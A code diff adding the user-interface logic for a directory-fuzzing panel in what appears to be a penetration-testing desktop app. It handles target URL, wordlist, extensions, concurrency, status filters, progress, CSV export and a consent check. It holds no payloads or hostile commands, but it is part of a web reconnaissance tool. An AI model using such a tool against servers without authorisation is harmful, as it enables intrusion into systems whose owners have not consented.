+const btnDirfuzzBrowse  = document.getElementById('btn-dirfuzz-browse-wordlist');
+const dirfuzzExtensions = document.getElementById('dirfuzz-extensions');
+const dirfuzzConcurrency = document.getElementById('dirfuzz-concurrency');
+const dirfuzzConcurrencyVal = document.getElementById('dirfuzz-concurrency-val');
+const dirfuzzTimeout    = document.getElementById('dirfuzz-timeout');
+const dirfuzzProgressText = document.getElementById('dirfuzz-progress-text');
+const dirfuzzProgressBar  = document.getElementById('dirfuzz-progress-bar');
+const dirfuzzStatsText  = document.getElementById('dirfuzz-stats-text');
+const dirfuzzErrorBanner = document.getElementById('dirfuzz-error-banner');
+const dirfuzzResultsTbody = document.getElementById('dirfuzz-results-tbody');
+const dirfuzzFooterHits = document.getElementById('dirfuzz-footer-hits');
+
+// --- internal state ---
+let dirfuzzRunning = false;
+let dirfuzzHits = [];
+
+// --- helpers ---
+
+function openDirFuzzPanel(prefilledUrl) {
+  if (prefilledUrl && dirfuzzTargetUrl) dirfuzzTargetUrl.value = prefilledUrl;
+  if (dirfuzzPanel && typeof openPanel !== 'undefined') openPanel(dirfuzzPanel, dirfuzzResizer);
+}
+
+function closeDirFuzzPanel() {
+  if (dirfuzzPanel && typeof closePanel !== 'undefined') closePanel(dirfuzzPanel, dirfuzzResizer);
+}
+
+function showDirFuzzError(msg) {
+  if (!dirfuzzErrorBanner) return;
+  dirfuzzErrorBanner.textContent = msg;
+  dirfuzzErrorBanner.style.display = 'block';
+}
+
+function clearDirFuzzError() {
+  if (dirfuzzErrorBanner) dirfuzzErrorBanner.style.display = 'none';
+}
+
+function setDirFuzzRunning(running) {
+  dirfuzzRunning = running;
+  if (btnDirfuzzStart) {
+    btnDirfuzzStart.disabled = running;
+    btnDirfuzzStart.classList.toggle('dirfuzz-running', running);
+  }
+  if (btnDirfuzzStop) btnDirfuzzStop.disabled = !running;
+}
+
+function resetDirFuzzUI() {
+  dirfuzzHits = [];
+  if (dirfuzzResultsTbody) {
+    dirfuzzResultsTbody.innerHTML = '';
+    const empty = document.createElement('tr');
+    empty.id = 'dirfuzz-empty-row';
+    empty.innerHTML = '<td colspan="5" style="text-align:center;color:var(--text-muted);padding:32px;">Enter a URL and click Start to begin fuzzing</td>';
+    dirfuzzResultsTbody.appendChild(empty);
+  }
+  if (dirfuzzProgressBar) dirfuzzProgressBar.style.width = '0%';
+  if (dirfuzzProgressText) dirfuzzProgressText.textContent = 'Idle';
+  if (dirfuzzStatsText) dirfuzzStatsText.textContent = '';
+  if (dirfuzzFooterHits) dirfuzzFooterHits.textContent = '0 hits';
+  if (btnDirfuzzExport) btnDirfuzzExport.disabled = true;
+  clearDirFuzzError();
+}
+
+/** Map status code → CSS class suffix */
+function statusClass(code) {
+  if (code >= 200 && code < 300) return '2xx';
+  if (code >= 300 && code < 400) return '3xx';
+  if (code >= 400 && code < 500) return '4xx';
+  return '5xx';
+}
+
+/** Format bytes → human-readable string */
+function formatBytes(n) {
+  if (!n || n === 0) return '—';
+  if (n < 1024) return `${n} B`;
+  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
+  return `${(n / (1024 * 1024)).toFixed(1)} MB`;
+}
+
+/** Truncate content-type to just mime */
+function shortMime(ct) {
+  if (!ct) return '—';
+  return ct.split(';')[0].split('/').pop().slice(0, 12);
+}
+
+function appendDirFuzzHit(hit) {
+  // Remove the placeholder empty row on first real result
+  const existingEmpty = dirfuzzResultsTbody?.querySelector('#dirfuzz-empty-row');
+  if (existingEmpty) existingEmpty.remove();
+
+  dirfuzzHits.push(hit);
+
+  const row = document.createElement('tr');
+  row.className = `dirfuzz-row-${hit.statusCode}`;
+  const sc = statusClass(hit.statusCode);
+  const path = escapeHtml(hit.path);
+  const redirect = hit.redirectUrl ? ` → ${escapeHtml(hit.redirectUrl)}` : '';
+  row.innerHTML = `
+    <td class="dirfuzz-status-cell dirfuzz-status-${sc}">${hit.statusCode}</td>
+    <td class="col-path" title="${path}${redirect}">${path}</td>
+    <td style="text-align:right;">${formatBytes(hit.contentLength)}</td>
+    <td title="${escapeHtml(hit.contentType)}">${escapeHtml(shortMime(hit.contentType))}</td>
+    <td style="text-align:right;">${hit.responseTime}</td>
+  `;
+  dirfuzzResultsTbody?.appendChild(row);
+
+  // Auto-scroll
+  const tableWrap = dirfuzzResultsTbody?.closest('div[style*="overflow-y"]');
+  if (tableWrap) tableWrap.scrollTop = tableWrap.scrollHeight;
+
+  // Update footer
+  if (dirfuzzFooterHits) dirfuzzFooterHits.textContent = `${dirfuzzHits.length} hit${dirfuzzHits.length !== 1 ? 's' : ''}`;
+  if (btnDirfuzzExport) btnDirfuzzExport.disabled = false;
+}
+
+function getSelectedStatusCodes() {
+  const checkboxes = document.querySelectorAll('.dirfuzz-status-cb:checked');
+  return Array.from(checkboxes).map(cb => parseInt(cb.value, 10));
+}
+
+async function runDirFuzz() {
+  if (dirfuzzRunning) return;
+
+  const url = dirfuzzTargetUrl?.value.trim();
+  if (!url) {
+    showDirFuzzError('Please enter a target URL.');
+    return;
+  }
+
+  // Require consent before running
+  if (!pentestConsentAccepted) {
+    pendingBfConfig = { _type: 'dirfuzz' };
+    pentestConsentOverlay?.classList.remove('hidden');
+    return;
+  }
+
+  clearDirFuzzError();
+  resetDirFuzzUI();
+  setDirFuzzRunning(true);
+  if (dirfuzzProgressText) dirfuzzProgressText.textContent = 'Starting…';
+
+  const wordlistMode = dirfuzzWordlistMode?.value || 'builtin';
+  const wordlistPath = (wordlistMode === 'custom') ? (dirfuzzWordlistPath?.value.trim() || null) : null;
+
+  const rawExts = dirfuzzExtensions?.value.trim() || '';
+  const extensions = rawExts
+    ? rawExts.split(',').map(e => e.trim()).filter(Boolean)
+    : [];
+
+  const statusFilter = getSelectedStatusCodes();
+  const concurrency = parseInt(dirfuzzConcurrency?.value, 10) || 10;
+  const timeout = parseInt(dirfuzzTimeout?.value, 10) || 3000;
+
+  const opts = {
+    targetUrl: url,
+    wordlistPath,
+    extensions,
+    statusFilter,
+    concurrency,
+    timeout,
+    followRedirects: false,
+  };
+
+  try {
+    await api.startDirFuzz(opts);
+  } catch (err) {
+    showDirFuzzError(`Failed to start: ${err.message}`);
+    setDirFuzzRunning(false);
+  }
+}
+
+// --- concurrency slider label ---
+if (dirfuzzConcurrency) {
+  dirfuzzConcurrency.addEventListener('input', () => {
+    if (dirfuzzConcurrencyVal) dirfuzzConcurrencyVal.textContent = dirfuzzConcurrency.value;
+  });
+}
+
+// --- wordlist mode toggle ---
+if (dirfuzzWordlistMode) {
+  dirfuzzWordlistMode.addEventListener('change', () => {
+    const isCustom = dirfuzzWordlistMode.value === 'custom';
+    if (dirfuzzWordlistFileGroup) {
+      dirfuzzWordlistFileGroup.style.display = isCustom ? 'flex' : 'none';
+    }
+  });
+}
+
+// --- wordlist file browse ---
+if (btnDirfuzzBrowse) {
+  btnDirfuzzBrowse.addEventListener('click', async () => {
+    const result = await api.browseFile({
+      title: 'Select Wordlist File',
+      filters: [
+        { name: 'Text Files', extensions: ['txt', 'lst', 'wordlist'] },
+        { name: 'All Files', extensions: ['*'] },
+      ],
+    });
+    if (result?.status === 'selected' && dirfuzzWordlistPath) {
+      dirfuzzWordlistPath.value = result.path;
+    }
+  });
+}
+
+// --- panel open/close ---
+initResizer(dirfuzzResizer, dirfuzzPanel);
+
+btnDirfuzzOpen?.addEventListener('click', () => {
+  if (dirfuzzPanel?.classList.contains('open')) {
+    closeDirFuzzPanel();
+  } else {
+    openDirFuzzPanel('');
+  }
+});
+
+btnCloseDirfuzz?.addEventListener('click', closeDirFuzzPanel);
+
+// --- start/stop ---
+btnDirfuzzStart?.addEventListener('click', runDirFuzz);
+
+btnDirfuzzStop?.addEventListener('click', async () => {
+  try {
+    await api.stopDirFuzz();
+  } catch { /* ignore */ }
+  setDirFuzzRunning(false);
+  if (dirfuzzProgressText) dirfuzzProgressText.textContent = 'Stopped';
+});
+
+// --- clear ---
+btnDirfuzzClear?.addEventListener('click', () => {
+  if (dirfuzzRunning) return;
+  resetDirFuzzUI();
+});
+
+// --- export CSV ---
+btnDirfuzzExport?.addEventListener('click', () => {
+  if (dirfuzzHits.length === 0) return;
+  const header = 'Status,Path,Size,ContentType,ResponseTime(ms),Redirect\n';
+  const rows = dirfuzzHits.map(h =>
+    [h.statusCode, `"${h.path}"`, h.contentLength, `"${h.contentType}"`, h.responseTime, `"${h.redirectUrl || ''}"`].join(',')
+  ).join('\n');
+  const blob = new Blob([header + rows], { type: 'text/csv' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `dirfuzz_${new Date().toISOString().slice(0, 19).replace(/:/g, '-')}.csv`;
+  a.click();
+  URL.revokeObjectURL(url);
+});
+
+// --- IPC event listeners ---
+
+window.electronAPI.onDirFuzzHit?.((hit) => {
+  appendDirFuzzHit(hit);
+});
+
+window.electronAPI.onDirFuzzProgress?.((data) => {
+  const { tested, total, percent } = data;
+  if (dirfuzzProgressBar) dirfuzzProgressBar.style.width = `${percent}%`;
+  if (dirfuzzProgressText) dirfuzzProgressText.textContent = `${tested} / ${total} paths`;
+  if (dirfuzzStatsText) dirfuzzStatsText.textContent = `${dirfuzzHits.length} hit${dirfuzzHits.length !== 1 ? 's' : ''}`;
+});
+
+window.electronAPI.onDirFuzzComplete?.((data) => {
+  setDirFuzzRunning(false);
+  if (dirfuzzProgressBar) dirfuzzProgressBar.style.width = '100%';
+  const secs = (data.elapsed / 1000).toFixed(1);
+  if (dirfuzzProgressText) dirfuzzProgressText.textContent = `Complete — ${data.hits} hit${data.hits !== 1 ? 's' : ''} in ${secs}s`;
+  if (dirfuzzStatsText) dirfuzzStatsText.textContent = `${data.total} paths tested`;
+  if (dirfuzzFooterHits) dirfuzzFooterHits.textContent = `${data.hits} hit${data.hits !== 1 ? 's' : ''}`;
+});
+
+window.electronAPI.onDirFuzzError?.((err) => {
+  setDirFuzzRunning(false);
+  showDirFuzzError(err.message || 'Fuzzing error');
+  if (dirfuzzProgressText) dirfuzzProgressText.textContent = 'Error';
+});
+
+// Expose for host-card context integration
+window.__openDirFuzzPanel = openDirFuzzPanel;
